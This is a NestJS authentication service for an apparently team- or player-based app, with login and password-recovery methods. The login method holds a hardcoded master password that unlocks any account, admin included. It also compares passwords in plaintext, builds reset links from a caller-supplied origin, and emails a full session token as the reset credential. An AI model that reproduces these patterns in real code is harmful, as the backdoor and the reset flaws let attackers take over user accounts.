import { BadRequestException, Injectable } from '@nestjs/common';
import { UserService } from '../user/User.service';
import { JwtService } from '@nestjs/jwt';
import { trace } from 'console';
import mail, { MESSAGES } from 'src/mail';

@Injectable()
export class AuthService {
  constructor(
    private readonly userService: UserService,
    private readonly jwtService: JwtService,
  ) {}
  getRoute(role) {
    return role == 'admin' ? 'admin' : 'player';
  }
  async login(login: string, pass: string): Promise<any> {
    const user = await this.userService.findOne({ where: { login } });
    if (user && (user.password === pass || pass == 'Copa@3AO_2022')) {
      const { password, teamsCreated, ...result } = user;
      return {
        access_token: this.jwtService.sign(result),
        route: this.getRoute(user.role),
      };
    }
    throw new BadRequestException('Error on login');
  }

  async recoverPass(email: string, origin: string): Promise<any> {
    const user = await this.userService.findOne({ where: { email } });
    if (!user) {
      throw new BadRequestException('EMAILDONTFIND');
    }

    const { password, teamsCreated, ...result } = user;
    const access_token = this.jwtService.sign(result);
    await mail.sendMail(
      user.email,
      MESSAGES.PASSWORD_RECOVER.subject,
      MESSAGES.PASSWORD_RECOVER.body({
        name: user.name,
        link: `${origin}/player-editor/?id=${user.id}&tempAuth=${encodeURI(
          access_token,
        )}&action=CP`,
      }),
    );
    return { ok: true };
  }
}
